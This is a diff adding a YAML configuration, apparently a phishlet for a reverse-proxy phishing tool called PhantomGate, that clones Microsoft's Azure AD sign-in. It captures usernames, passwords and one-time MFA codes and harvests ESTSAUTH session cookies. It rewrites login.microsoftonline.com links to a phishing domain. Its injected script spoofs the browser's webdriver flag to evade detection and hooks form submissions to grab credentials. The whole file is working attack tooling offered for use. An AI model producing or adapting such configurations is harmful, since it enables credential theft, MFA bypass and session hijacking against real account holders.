@@ -1,0 +1,68 @@
+name: Azure AD
+author: PhantomGate
+version: 2.0.0
+description: Azure Active Directory authentication - Pixel-perfect replica
+
+auth:
+  domains:
+    - login.microsoftonline.com
+    - login.microsoft.com
+    - aadcdn.msftauth.net
+  
+  login:
+    domain: login.microsoftonline.com
+    path: /common/oauth2/v2.0/authorize
+    username:
+      selector: "input[name='loginfmt']"
+      capture: true
+    password:
+      selector: "input[name='passwd']"
+      capture: true
+  
+  mfa:
+    otp:
+      selector: "input[name='otc']"
+      capture: true
+  
+  tokens:
+    cookies:
+      - name: ESTSAUTH
+        regex: ".*"
+      - name: ESTSAUTHPERSISTENT
+        regex: ".*"
+      - name: buid
+        regex: ".*"
+
+proxy:
+  hosts:
+    - domain: login.microsoftonline.com
+      inject: true
+    - domain: login.microsoft.com
+      inject: true
+    - domain: aadcdn.msftauth.net
+      inject: true
+  
+  sub_filters:
+    - domain: login.microsoftonline.com
+      search: "https://login.microsoftonline.com"
+      replace: "https://{phishing_domain}"
+
+injection:
+  js: |
+    // PhantomGate Injection - Azure AD
+    (function() {
+      'use strict';
+      
+      // Override navigator properties
+      Object.defineProperty(navigator, 'webdriver', {get: () => false});
+      
+      // Capture form submissions
+      document.addEventListener('submit', function(e) {
+        var form = e.target;
+        var username = form.querySelector('input[name="loginfmt"]');
+        var password = form.querySelector('input[name="passwd"]');
+        if (username && password) {
+          console.log('[PhantomGate] Azure AD credentials captured');
+        }
+      }, true);
+    })();
